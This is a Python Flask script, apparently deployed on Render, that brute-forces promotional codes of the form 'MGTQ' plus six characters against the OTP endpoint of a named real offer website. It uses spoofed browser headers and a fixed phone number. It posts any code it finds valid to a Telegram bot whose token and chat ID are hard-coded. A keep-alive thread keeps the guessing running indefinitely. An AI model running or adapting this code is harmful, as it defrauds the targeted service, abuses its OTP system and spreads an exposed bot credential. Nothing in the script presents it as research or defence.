import os
import time
import random
import string
import json
import threading
import requests
from flask import Flask
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# ================== Configuration ==================
BASE_URL = "https://www.ossw.theofferclub.in"
OTP_ENDPOINT = f"{BASE_URL}/home/generateOTP"
TEST_MOBILE = "9038529139"
NUM_CODES = 100000
MAX_WORKERS = 5
DELAY_PER_THREAD = 2.0

# Telegram Bot Configuration
TELEGRAM_TOKEN = "8853159534:AAHljkPYZ3X6Ktx5c1UrHXJjZupvFji47DU"
TELEGRAM_CHAT_ID = "5177144784"

# ================== Helper Functions ==================
def send_telegram_message(text):
    """Send a message to your Telegram bot."""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram send error: {e}")

def generate_random_code() -> str:
    """Generate a random code in the format: MGTQ + 6 alphanumeric chars."""
    prefix = "MGTQ"
    chars = string.ascii_uppercase + string.digits
    random_part = ''.join(random.choices(chars, k=6))
    return prefix + random_part

def check_code(code: str, mobile: str = TEST_MOBILE) -> dict:
    """Send POST request to check if the code is valid."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://www.ossw.theofferclub.in/",
        "Origin": "https://www.ossw.theofferclub.in",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {"phone": mobile, "ccode": code}
    start_time = time.time()

    try:
        response = requests.post(OTP_ENDPOINT, data=data, headers=headers, timeout=15)
        response_time = round((time.time() - start_time) * 1000, 2)
        result = {
            "code": code,
            "status_code": response.status_code,
            "response_time_ms": response_time,
            "valid": False,
            "message": "",
        }

        if response.status_code == 200:
            try:
                json_resp = response.json()
                if json_resp.get("status") == "success":
                    result["valid"] = True
                    result["message"] = "✅ VALID - OTP Sent Successfully"
                elif json_resp.get("status") == "failure":
                    msg = json_resp.get("msg1") or json_resp.get("msg") or "Unknown failure"
                    result["message"] = f"❌ {msg}"
                elif json_resp.get("status") == "code_failure":
                    result["message"] = f"❌ Invalid Code: {json_resp.get('msg', 'N/A')}"
                else:
                    result["message"] = f"❌ Unknown status: {json_resp.get('status')}"
            except:
                result["message"] = "❌ Failed to parse JSON"
        else:
            result["message"] = f"❌ HTTP Error {response.status_code}"
        return result
    except Exception as e:
        return {
            "code": code,
            "status_code": 0,
            "response_time_ms": round((time.time() - start_time) * 1000, 2),
            "valid": False,
            "message": f"❌ Request Error: {str(e)}",
        }

def process_code(code: str):
    """Process a single code and notify Telegram if valid."""
    result = check_code(code)
    print(f"🔍 {code} -> {result['message']}")
    if result["valid"]:
        msg = f"🎉 VALID CODE FOUND!\n🔑 Code: {code}\n📱 Mobile: {TEST_MOBILE}\n⏱️ {time.strftime('%Y-%m-%d %H:%M:%S')}"
        send_telegram_message(msg)
        # Save to file for record
        with open("valid_codes.txt", "a") as f:
            f.write(f"{code} | {TEST_MOBILE} | {time.ctime()}\n")

def keep_alive():
    """Keep the Flask server alive by pinging it every 10 minutes."""
    url = "https://your-app-name.onrender.com/"
    while True:
        time.sleep(600)  # Sleep for 10 minutes (600 seconds)
        try:
            requests.get(url, timeout=10)
            print("Keep-alive ping sent.")
        except Exception as e:
            print(f"Keep-alive ping failed: {e}")

def run_validator():
    """Main validator loop running in background thread."""
    print("🚀 Code validator started in background thread.")
    send_telegram_message("🚀 OTP Code Validator started on Render Web Service!")
    while True:
        codes = [generate_random_code() for _ in range(NUM_CODES)]
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            executor.map(process_code, codes)
        print(f"Finished a batch of {NUM_CODES} codes. Sleeping for 5 seconds...")
        time.sleep(5)

# ================== Flask Routes ==================
@app.route('/')
def home():
    """Root endpoint to keep the service alive."""
    return "OTP Code Validator is running!", 200

@app.route('/status')
def status():
    """Status endpoint to check if the service is healthy."""
    return json.dumps({"status": "running", "mobile": TEST_MOBILE}), 200, {'Content-Type': 'application/json'}

# ================== Main Entry Point ==================
if __name__ == '__main__':
    # Start the validator in a background thread
    validator_thread = threading.Thread(target=run_validator, daemon=True)
    validator_thread.start()
    print("Validator thread started.")
    # Start the keep-alive thread (optional but recommended)
    keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()
    # Get the port from the environment variable (Render sets this)
    port = int(os.environ.get("PORT", 5000))
    print(f"Starting Flask server on port {port}.")
    # Run the Flask web server (this blocks the main thread)
    app.run(host='0.0.0.0', port=port)
